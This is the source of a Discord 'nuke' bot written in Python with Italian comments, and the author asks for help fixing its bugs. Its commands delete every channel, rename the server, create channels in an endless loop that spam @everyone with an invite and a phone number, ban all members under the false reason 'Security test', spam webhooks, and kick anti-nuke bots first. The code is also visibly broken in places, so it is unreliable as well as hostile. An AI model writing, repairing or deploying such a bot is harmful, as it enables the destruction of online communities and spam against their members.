# IL CODICE È BUGGATO , CHIUNQUE VOGLIA AIUTARMI PUO SCRIVERMI SU DS O IG
# ds : lasciato , ig : sopportarti
# CAUSA BUG : bug nella velocità di creazione di canali
# CAUSA BUG : bug nello spam di canali
# ------------------------------------------------------------------------
# codice fatto da : blck/blck67 
# per qualsiasi cosa scrivermi su ds : lasciato
# per aiutarmi nello script scrivermi su ds

# ------------------------------------------------------------------------

import discord
from discord.ext import commands
import asyncio
import aiohttp

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=",", intents=intents) #intents e prefisso ,

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}") # manda un messaggio in cmd quando lo accendi

# ----------------------------------------------------------------------------
@bot.command() # comando di nuke vero e proprio (da fixxare molto buggato)
async def x(ctx):
    guild = ctx.guild
    
    try:
        await guild.edit(name="discord.gg/aisypub aura")
    except:
        await ctx.send("error")
    
    try:
        await guild.edit(icon=None)
    except:
        await ctx.send("error")

    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    for i in range(99999999999999999999999999):
        new_channel = await guild.create_text_channel(f"fucked-by-blck-{i}")
        await new_channel.send("@everyone discord.gg/aisypub - wz +54 92331402999")
        await asyncio.sleep(1)
    

# ----------------------------------------------------------------------------
@bot.command() # comando che banna tutti gli utenti del server con motivazione finta (da fare dopo il completamento nel nuke)
async def banall(ctx):
    guild = ctx.guild
    
    count = 0
    for member in guild.members:
        if not member.bot:
            try:
                await member.ban(reason="Security test")
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
    
    await ctx.send(f"banned {count} users.")

# ----------------------------------------------------------------------------
@bot.command() # spammer di webhook
async def whs(ctx, webhook_url: str, *, message: str):
    
    async with aiohttp.ClientSession() as session:
        for i in range(10):
            try:
                async with session.post(webhook_url, json={"content": message}) as resp:
                    pass
                await asyncio.sleep(0.5)
            except:
                pass
    
    await ctx.send("done")
    
# ----------------------------------------------------------------------------
@bot.command() # kicka tutti i bot (usarlo prima di ,x per togliere antinukers)
async def kickbots(ctx):
    guild = ctx.guild
    bot_id = bot.user.id

    kick_tasks = []
    count = 0

    for member in ctx.guild.members:
       if member.bot and member.id != bot_id:
        kick_tasks.append(member.kick(reason="bot kick"))
        count += 1
    if len(kick_tasks) >= 20:
       await asyncio.gather(kick_tasks, return_exceptions=True)
       kick_tasks = []
    if kick_tasks:
      await asyncio.gather(kick_tasks, return_exceptions=True)
      await ctx.send(f"kicked {count} bots.")
# ----------------------------------------------------------------------------
# bot running
bot.run("YOUR_BOT_TOKEN")
